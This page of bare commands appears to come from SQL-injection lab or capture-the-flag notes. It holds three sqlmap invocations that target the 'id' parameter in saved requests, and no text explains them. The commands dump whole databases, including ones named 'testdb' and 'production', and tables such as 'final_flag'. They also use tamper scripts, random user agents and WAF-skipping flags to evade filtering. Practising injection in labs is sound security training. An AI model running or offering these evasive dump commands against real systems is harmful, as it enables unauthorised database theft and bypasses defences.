# Page 3

{% code overflow="wrap" %}
```
sqlmap -r case10.txt -p id -D testdb --dump-all --batch --level=2 --risk=3 --tamper=base64encode --random-agent --skip-waf
```
{% endcode %}

{% code overflow="wrap" %}
```
sqlmap -r case11.txt -p id -D testdb -T flag11 --dump-all --batch --level=2 --risk=3 --tamper=between --random-agent --skip-waf
```
{% endcode %}

{% code overflow="wrap" %}
```
sqlmap -r final01.txt -p id -D production -T final_flag --batch --level=2 --risk=3 --tamper=between --random-agent --skip-waf --dump 
```
{% endcode %}
